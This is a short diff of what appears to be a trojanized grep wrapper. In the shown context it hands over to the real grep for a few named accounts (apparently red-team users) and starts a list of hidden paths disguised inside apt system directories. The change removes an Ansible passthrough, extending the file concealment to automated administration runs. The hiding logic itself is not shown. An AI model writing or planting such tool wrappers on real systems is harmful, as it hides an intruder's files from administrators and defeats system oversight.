@@ -6,11 +6,6 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_GREP "$@" ;;
 esac
 
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_GREP "$@"
-fi
-
 HIDDEN_PATHS=(
     "/var/lib/apt/lists/.cache"
     "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
